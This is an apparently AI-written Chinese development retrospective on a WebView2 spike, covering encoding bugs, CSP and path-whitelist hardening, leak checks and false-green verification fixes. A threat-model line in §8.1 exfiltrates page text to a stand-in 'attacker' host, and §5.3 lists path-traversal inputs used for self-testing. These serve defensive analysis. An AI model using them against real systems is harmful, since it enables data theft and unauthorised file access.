### 遇到的第一个问题：中文注释把 PowerShell 解析器带崩

我写了 `tools/build.ps1`（带一大段中文注释），一跑就报：

```
The token '||' is not a valid statement separator in this version.
The string is missing the terminator: ".
The Try statement is missing its Catch or Finally block.
```

**全都在指向错误的方向**——`||` 我写在 here-string 里、字符串也没少引号。

**当时怎么想的**：三条报错互相矛盾，说明解析器读到的**不是我以为的那份文本**。
顺着"读到的文本不对"往回查，才想到编码：Windows PowerShell 5.1 对**无 BOM** 的 `.ps1`
按系统代码页解，这台机器是 **936（GBK）**，于是我的 UTF-8 中文注释被解成乱码，
解析器在乱码上崩，报出来的位置全是噪音。

**解法**：`.ps1` 一律带 **UTF-8 BOM**。而且——**这条规则会被无声打破**（编辑工具改写文件通常不保留 BOM，
我就被吃掉过两次），所以我写了 `tools/check-ps1-encoding.py`，
并让它**被 `phase0-verify.ps1` 调用**。
（这里有个二手教训：写了检查器却没人调用它 = 等于没写。这条后来被交叉审查点名了，
原文是"检查器躺在抽屉里"。）

### 第二个绊脚石：Git Bash 的 `//c` 与"GUI 程序 PowerShell 不等"

- `cmd //c "..."` 从 Git Bash 发出去会被路径转义搞坏（报"系统找不到指定的路径"，而路径其实存在）。
  后来统一改成**写一个 `.bat` 再用 PowerShell 跑**，或直接用 PowerShell 原生写法。
- `isg-spike` 是 **WIN32 子系统**程序，PowerShell 的 `&` 调用**不会等它**——
  第一次跑发现"没有任何输出、`$LASTEXITCODE` 是空的"，一度以为程序没起来。
  解法：`Start-Process -Wait`，或（更准）用 `.NET Process` + `WaitForExit()`。
  **这个坑后来还有下半段**，见 §5。

## 4. 写 spike：那些"编译就教你做人"的 API 细节

Trace 一次编译错误，因为它很典型——**MSVC + WebView2 的第一轮几乎全是签名问题**：

| 报错 | 真因 |
|---|---|
| `D8016: "/utf-8" 和 "/source-charset:utf-8" 不兼容` | `/utf-8` **就是** source+execution charset 的组合，不能再单独写一个 |
| `未声明的标识符 CoreWebView2EnvironmentOptions` | 它在 `WebView2EnvironmentOptions.h` 里，**不在** `WebView2.h` 里 |
| `"SetVirtualHostNameToFolderMapping": 不是 "ICoreWebView2" 的成员` | 它挂在 **`ICoreWebView2_3`** 上，要 `QueryInterface` 升上去 |
| `CreateStreamOnHGlobal: 无法将 HRESULT 转换为 IStream*` | 它是 **HRESULT + 出参**的形态，不是返回指针 |
| `"to_utf8": 没有重载可以转换所有参数` | 我把 `std::wstring` 赋给了 `std::string` 成员 |

**当时的心态**：这些都不可怕，可怕的是**它们全都编不过**（fail-loud）。
我真正警惕的是那些**编得过、跑得起来、结果是错的**——那才是这个项目的敌人。

## 5. 第一次跑通之后，我开始怀疑自己

spike 第一次跑真实产物页：六项判据**全部打绿**，探针跑完，陪练认出内置大肥鱼，几何信息是真值。
那一瞬间是很想就此收工的。

但有两件事让我停住了：

**第一件**：报告里的中文是乱码（`銆愭帰閽堛€`）。
我没有直接去改代码，而是先问"是文件真乱码，还是我看它的方式不对"。
用能按 UTF-8 读的工具再看一遍——**文件是好的**，乱码来自 PowerShell 5.1 的 `Get-Content`
默认按 ANSI 解。**差别很大**：一个要改代码，一个只要改读法。
（后来我把这条写进了报告生成侧：报告统一 UTF-8，读的人自己选编码。）

**第二件，也是这次最重要的转折**：我的判据说"协议与 CSP ✅"，
但**我并没有真的证明 CSP 在拦东西**。我当时的判据是"过滤器注册成功了"——
这句话证明的是"我打算拦"，不是"拦到了"。

于是我做了一个 A/B：同一页，一个带 CSP 响应头、一个不带。**两边都是 0 条违规。**

### 5.1 那一刻的排查路径（值得完整记下来）

1. **先怀疑探针**：是不是 `securitypolicyviolation` 事件没绑对？
   → 我没有改探针，而是在 C++ 侧加了计数器（`docRequestSeen` / `docResponseServed` /
   `wrcAll` / `filterHr`）。**先让程序自己说出真相，别猜。**
2. **数据说话**：`filterHr=0x00000000`（过滤器注册成功）、**`wrcAll=1`**、
   `docRequestSeen=0`、`docResponseServed=0`。
   而唯一的 `wrcAll=1` 命中的是——**页内 iframe 的那个 `https://example.com/`**。
3. **结论**：**被 `SetVirtualHostNameToFolderMapping` 服务出来的文档请求，
   根本不触发 `WebResourceRequested`。** 我们那一页的文档请求一次都没进来。
   CSP 从来没挂上去；页面照渲染、探针照跑绿 —— **彻头彻尾的静默失效**。
4. **最难受的一点**：我自己在纲领里读到过"这个项目最恨静默失效"，
   然后**我亲手又造了一个**，还给它打了绿勾。原因就是我查了"意图"没查"结果"。

### 5.2 解法（以及为什么它是更好的设计）

放弃虚拟主机映射，**文档与同目录资源全部由自己按显式白名单服务**：

- 过滤器收 `ALL`（文档要加 CSP，图片/字体要按白名单取文件）；
- 路径处理顺序写死：**去 query/fragment → 百分号解码 → `GetFullPathNameW` 归一化 → 再比目录前缀**；
- 显式拒绝：UNC、`\\?\` 设备路径、根相对、**任何含冒号的**（冒号能写驱动器绝对路径，也能写 NTFS 数据流）。

这个改法**不只是绕开一个 bug**——它更贴合 oracle 的形态：`preview.js` 的白名单本来就该在
**我们代码里**，而不是被交给 WebView2。纲领 §1.4 那句"本地资源协议只服务显式放行过的目录"，
本来就是要求这个。

并且我把**判据本身**也改了：
`4a_document_served`（文档真的由我们送出）与 `4b_csp_header_sent`（那条响应真的带了 CSP 头）。
**判据必须看结果，不能看意图。**

### 5.3 顺带做的一次"打自己"

我把 6 类越界路径拿去撞自己的白名单（`..%2f`、`%2e%2e%2f`、反斜杠、驱动器绝对路径、
NTFS 数据流、双重编码）。全部没被服务出去。其中两条一开始只是"落到 404"，
**没有被显式拒绝**——我把"含冒号"那条补上，让它们变成明确的 403。
**安全边界不自己撞一遍，就等于没验过。**

## 6. 两个"数字骗了我"的时刻

### 6.1 "热启动比冷启动慢 13 倍"

第一次量启动，得到：

```
cold-1  win 74  ctrl 433  nav 2629
hot-1   win 74  ctrl 6555 nav 8741     ← 慢了 13 倍？
```

热启动比冷启动慢一个数量级，这**违反常识**，所以一定是测量错了。

查下去发现：上一轮的 `msedgewebview2.exe` 浏览器进程**还在退场**，
而它握着同一个 user data folder；下一轮 `CreateCoreWebView2Controller` 就只能干等它。

**解法**：测量脚本每一轮之前，**按自己的 `--user-data-dir` 把自己派生的进程清干净**。

**这里又有一个次级教训**：我第一版清理写的是 `Get-Process msedgewebview2 | Stop-Process`
——**一刀切把全机的浏览器进程都杀了**。而这台机器上 `SearchHost.exe`（Windows 搜索）
正挂着 **6 个** msedgewebview2。我差点去动了与本工程无关的系统组件。
改成"按命令行里的 `--user-data-dir` 精确过滤"。
**这一条后来被交叉审查进一步挑出漏洞**：WebView2 的 crashpad 等辅助进程命令行里有
user-data-dir、却**没有** `--webview-exe-name`，只认后者会漏掉它们——而它们恰好握着文件锁。
改成两个条件满足其一。

### 6.2 "墙钟 10 秒对不上 3 秒的活儿"

报告说活儿在 ~2.9 s 干完，外面量的墙钟却是 10 s。差了 7 秒，说不清去哪了。

我在 `main.cpp` 末尾加了一个"退出标记"文件，写下"我们自己的活儿什么时候干完"，
再和外部墙钟相减 —— 差值只剩下 ~50 ms。

**真因**：我外面用的是 `Start-Process -Wait`，而 PowerShell 的 `-Wait`
会连**整棵进程树**一起等，WebView2 的浏览器进程还要磨蹭几秒。
换成 `.NET Process` + `WaitForExit()` 之后数字立刻合理。

**这条直接催生了后来的一整节**："关得干净"要能量化——宿主自己的收尾（~50 ms）
与浏览器进程残留（6.5–6.7 s）是**两件事**，混在一起就会得出错误结论。

## 7. 泄漏检查：我写了检查，然后证明它会响

按用户要求（C++ 要关得干净、不野指针、不漏），我加了 CRT 泄漏检查。跑完 **stderr 是空的**。

"没有泄漏报告"和"检测器根本没装上"在输出上**一模一样**——所以我不能就这么收工。
写了个 `--leak-selftest`：**故意漏 4 KB**。

结果：**还是不响。** 一路查：

1. **`_DEBUG` 没定义。** Ninja 生成器不像 Visual Studio 工程，不会自动带上它；
   而我的检查整段裹在 `#ifdef _DEBUG` 里 → **被完整编译掉了**。
   → CMake 里显式加 `$<$<CONFIG:Debug>:_DEBUG>`，并链调试版 CRT（`CMP0091`）。
2. 修好后响了（退出码 3），但**正常路径也报泄漏**。
   → 因为我在 `wWinMain` 末尾直接 `_CrtDumpMemoryLeaks()`，
   那时 `app`、`apartment` 这些局部对象**还活着**，它们持有的缓冲被当成泄漏。
   一条**假警报比没有检查更糟**——它会训练人忽略这份报告。
   → 改成只设 `_CRTDBG_LEAK_CHECK_DF`，让 CRT 在**进程退出时**写，
   把落盘通道指向一个自己开的文件（那个句柄**故意不关**，它是报告的去处）。
3. 还有一个小坑：`_CrtSetDbgFlag` 返回的是**改之前**的值，
   我拿它当"现在状态"打印，得到"标志没设上"的假象。要读现状就再问一次 `_CRTDBG_REPORT_FLAG`。

**沉淀成一条规矩**（后来写进了 README）：

> **凡"没出事"的结论，先证明检测器会响。**

这条规矩后来又被用了一次：CSP 的 A/B、白名单的越界测试、以及验证脚本的假绿修复。

## 8. 三路交叉审查：审出来的比我自测出来的多

用户要求"跑完所有重写任务后，开 3 个子代理交叉检验，然后修，仅限一次"。我开了三路：
**C++ 正确性与内存安全** / **与纲领和规格书的一致性** / **验证体系的可信度**。

结果对我是一次挺不客气的教育。挑几条最重的：

### 8.1 我自己的账没记好（一致性那一路）

- **我写进纲领的一组启动数字，和仓库里那份报告全部对不上**。
  不是造假——那组数来自更早一次运行，但**基准输出从来没落盘**（只打 stdout，早被冲掉了）。
  于是仓库里唯一无法复现、也没有原始证据的一组数，恰恰是被反复引用的那几个。
  → 现在基准结果落成 `spike/_fixtures/bench-summary.json`（`.gitignore` 专门放行），
  纲领每个数都注明出处。
- **"6 段题库"是我数错的**：那是 grep 命中 `data-bank` 的次数，
  实际 `<script data-bank>` **只有 4 段**（另外 2 次是引擎 JS 里的字符串）。
  这个数写在判据表里，会被后来的人当验收标准。→ 改了，并让脚本自己数。
- **"32 个通道"是继承来的错**：`preload.js` 的 `CHANNELS` 实测 **31 条**
  （31 + `job:event` 订阅 ≈ 32 的来源）。它是 **Phase 1 的 DoD**，
  照字面做会多登记一个不存在的通道。→ 改了，并注明口径。
- **我漏记了一层 oracle 有、而 CSP 覆盖不到的东西**：探针窗口的**导航守卫**
  （`verify/guard.js`）。页面里一句 `location.href='https://attacker/?d='+document.body.textContent`
  就能把读到的课件正文发出去，而**页面自己的 CSP 拦不住导航**。→ 补进纲领遗留。
- **我把存储隔离写成了"独立 profile"**——那恰是 oracle 亲手废掉的方案
  （每轮新起 session，Electron 从不回收，实测 **+1.29 MB 原生内存/次**；
  改成固定 3 个 partition 轮转 + 跑完 `clearStorageData` 只要 +47 KB）。
  我用了"等价"两个字把两者划了等号。→ 改了措辞。

**这一路的共同点是**：都不是代码错，是**我把话说得太满**。
而这个项目最忌讳的就是"把估计值说成实测值、把'没验'说成'验过'"。

### 8.2 四个高危代码问题（正确性那一路）

1. **`build.ps1 -Clean` 的删除指令没有任何护栏。**
   路径全来自 `-BuildDir` 参数，`-BuildDir ..\..` 能删到工程外，`-BuildDir spike` 会删掉源码目录。
   讽刺的是我在 `bench-startup.ps1` 里写了三条断言的护栏，却**没往这里抄**。
   → 收成 `tools/_guard.ps1` **一份实现**（非空 / 绝对 / 在允许根内 / 叶子名合规 /
   不是重解析点 / 是目录），三处调用都走它。**同一件事有多个实现，就等于有多个走散的机会。**
2. **白名单拿"规范化后的路径"比"没规范化的目录"。**
   `full` 出自 `GetFullPathNameW`（绝对、反斜杠、`..` 已折叠），`root` 是用户原样给的串。
   两者写法一不同，前缀比较永远不成立 → **页面自己的文档请求被判 403**。
   而 README 里那条示例命令正好是相对路径写法，**直接跑不通**，报错还指向"虚拟主机映射有问题"。
   更难受的是：**这个坑 oracle 踩过、并把结论写进了注释**
   （`preview.js:172-180`："路径拼法没归一化 → 每个请求都 403……Windows 上完全看不出来"）。
   我读过那份文件，还是重造了一遍。→ 入口处归一化一次 + `resolve_within` 内部也归一化。
3. **判据表与退出码是两套互不相干的账。**
   `criteria` 算出来只用来打印，`ok_` 只由 `MarkFail` 置位 → `--no-webview` 下五项判据全 false、
   退出码却是 0、还打印"六项判据全过"。而调用方正是拿这个码判 go/no-go。
   → 加 `completed_` 标志（只有 `Finish()` 会置位，消息循环因别的原因结束一律不算数），
   把判据汇进 `ok_`，措辞改成说清"这次评估了什么"。
4. **pending 守卫排在超时判定前面。**
   ```cpp
   if (titlePending_) return;    // ← deadline 在它后面，永远轮不到
   if (now > deadline_) { ... }
   ```
   只要 WebView2 那侧的回调永远不来（浏览器进程崩了/挂了），pending 就永远为 true，
   每一拍定时器都提前 return → **超时永不生效、进程永久挂在屏幕外的窗口里**
   （不可见、点不到、关不掉），而调用方的 `-Wait` 也没有超时。
   → 顺序倒过来 + 注册 `add_ProcessFailed` 一失败立刻收工。

### 8.3 最狠的一路：它在真产物上复现了我的假绿

验证体系那一路做了一件我一直没做的事：**它去证明我的检查会失败**。

它把一份真实产物（`assemble.js` 的输出）复制出来，**摘掉最后一个作答点的按钮**，
喂给我的 `phase0-verify.ps1` —— **脚本报"结论：全部通过"**，退出码 0。

原因：`verify-probe.js` 里抛错的题走 `catch` 分支 `thrown++`，
而判定"是否判对"的那一行**在抛错时根本不会执行**。于是"这道题没验成"被记成"这道题没判错"。
而我的判据只查了 `判错=0`、**从没查过 `抛错=0`**——它们就在同一个字符串里，隔着 14 个字符。
更糟的是我打印证据时把标题截到 60 字，**"抛错=1"正好落在截断之外**。

它一共列出 11 类假绿。最危险的一类不是任何单条判据，而是：

> **脚本中途任何一次失败都只是"不写报告"，于是盘上留着上一份"全部通过"。**

取数抛错、基准脚本崩、路径不存在——三种都让脚本中止，而 `docs/phase0-report.md`
原封不动，末行仍是绿的。**任何读它的人或自动化看到的都是绿的。**

**解法**：整个 `phase0-verify.ps1` 重写。三条规矩写在文件头：

1. **报告一开始就写成"运行中（未得出结论）"**，结尾才覆盖；
   这一步排在**所有检查之前**，包括 `-Exe` 存在性检查。
2. **判据一律断言"数字"，不断言"程序自报的布尔"**。
   通过条件如果就是被测程序自己算的那个 `criteria.3_layout_alive`，
   那这一条等价于"它说它对"（实测：`geometry` 全是 0 的报告照样能过）。
3. **取数必须显式判"取到了没有"**。PowerShell 的
   `[int]($null -replace '…(\d+)…','$1')` = **0**（不报错）——
   于是"没解析出违规数"被静默读成"违规 0 条"、CSP 的**对照臂凭空成立**。

还有一些同类修法：越界用例改成同时断言 `deniedCount ≥ 1`（"没被服务出去"可能是 404 而不是被白名单拒）；
CSP 门槛从 `≥4` 提到 `=5`；`脚本错误=无` 改成带分隔符匹配（否则会被"异步脚本错误=无"顶替）；
CSP 对照的两轮用唯一文件名 + 读前断言存在（固定名会读到上一轮的陈旧报告）；
判据 6 加阈值（原来只打印、从不参与判分）；判据 7 缺 Debug 版时记 FAIL 而不是静默跳过。

### 8.4 修完，我拿同一个 mutation 打自己

改完不是就算完——我把那份被篡改的页面重新喂进去：

```
[FAIL] 2  自动作答：判错=0 且 抛错=0  —— 判错/抛错：判错=0 抛错=1
=== 结论：1 项未过 ===     退出码=1
```

顺手也验了陈旧绿：让脚本在参数阶段就失败，盘上旧报告的第一行被压成
`**运行失败**：找不到 …`。

**一条断言只有被证明会失败，才算数。**

## 9. 我的心路（这一节写给下一个接手的人）

**① 最难的不是写代码，是"不让自己被骗"。**
这次真正花时间的，没有一处是"怎么调 WebView2 API"。
时间几乎全花在：CSP 到底挂上没有、热启动那个 13 倍是不是真的、
那 7 秒去哪了、泄漏检查到底在不在工作、我的判据会不会假绿。
纲领说这个产品最难的是"证明产出是对的"，我这一趟的体感是：
**这句话对"重写过程本身"同样成立。**

**② 我的默认倾向是"相信自己的判据"，这是错的。**
CSP 那次我打了绿勾，是因为我查了"意图"（过滤器注册成功）而不是"结果"（响应真的带了这个头）。
后来我尽量把每条判据都写成"结果式"的，并且在写完之后习惯性问一句：
**"它要是假的，会是什么样？"**

**③ 我重复了 oracle 已经踩过、并写在注释里的坑。**
白名单归一化那次最典型——`preview.js` 的注释里连审计留档路径都写了，我读过那份文件，
还是重造了一遍。**这个项目的注释密度不是装饰，是"一个都不丢"的实现方式。**
我后来的做法是：写任何"看起来是新问题"的东西之前，先 grep 一遍 oracle 和 `pitfalls.md`。

**④ 我倾向于把话说满，这是个真实的毛病。**
"六项判据全过"——其中两项根本不在 exe 内评估；
"32 个通道"——我没数就抄了；
一组启动数——我没留原始件就写进了"实测"。
**现在我的做法是：凡是数字，都要能指到一份文件；凡是结论，都要说清它覆盖了什么、没覆盖什么。**

**⑤ 用户的两次中途提醒都指到了要害。**
一次是"C++ 一定要写好关闭程序、避免野指针和内存泄漏"——这直接催生了
退出标记、泄漏自检、收尾顺序写死那一整套；
一次是"删除指令要三思"——这直接催生了 `_guard.ps1`，
而交叉审查随后就在 `build.ps1 -Clean` 上抓到一个真实的越界删除。
**这两条不是附注，是设计约束。**
